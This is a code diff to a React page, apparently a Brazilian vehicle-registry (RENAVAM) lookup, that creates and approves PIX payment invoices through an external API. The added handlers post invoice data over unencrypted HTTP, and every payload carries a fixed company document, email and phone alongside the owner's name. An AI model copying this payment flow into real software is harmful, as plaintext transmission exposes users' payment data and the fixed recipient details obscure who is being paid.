@@ -64,6 +64,32 @@ const ResultadoRenavam = () => {
 
   const router = useRouter();
 
+  const handleCreate = async () => {
+    try {
+      const response = await axios.post(
+        "http://passport-api-urnz.onrender.com/createds",
+        invoiceData
+      );
+      alert("Invoice criada com sucesso!");
+      console.log(response);
+    } catch (error) {
+      alert("Erro ao criar invoice");
+    }
+  };
+
+  const handleApprove = async () => {
+    try {
+      const response = await axios.post(
+        "http://passport-api-urnz.onrender.com/approveds",
+        invoiceData
+      );
+      alert("Invoice aprovada com sucesso!");
+      console.log(response);
+    } catch (error) {
+      alert("Erro ao aprovar invoice");
+    }
+  };
+
   const iniciarPolling = (invoiceId) => {
     if (!invoiceId) return; // Não inicia o polling se o ID da fatura não existir
 
@@ -135,7 +161,7 @@ const ResultadoRenavam = () => {
       // Dados mockados para envio
       const payload = {
         costumerData: {
-          name: "MINAS GERAIS",
+          name: data.proprietario.nome,
           document: "18715615000160",
           email: "taxas@gmail.com",
           phone: "73982340745",
@@ -176,7 +202,7 @@ const ResultadoRenavam = () => {
 
       // Chamada à API
       const response = await axios.post(
-        "https://passport-api-urnz.onrender.com/create-invoice",
+        "http://localhost:3030/create-invoice",
         payload,
         {
           headers: {
@@ -639,8 +665,8 @@ const ResultadoRenavam = () => {
                 const response = await enviarDadosParaAPI(valorTotal);
 
                 // Atualiza o estado `codPix` com o valor retornado da API
-                const codigoPix = response?.invoice?.fatura?.pix?.payload;
-                const invoice = response?.invoice?.fatura?.id;
+                const codigoPix = response?.witepay.qrcode?.qrcode;
+                const invoice = response?.tryplo.invoice?.fatura?.id;
 
                 if (codigoPix) {
                   setCodPix(codigoPix);
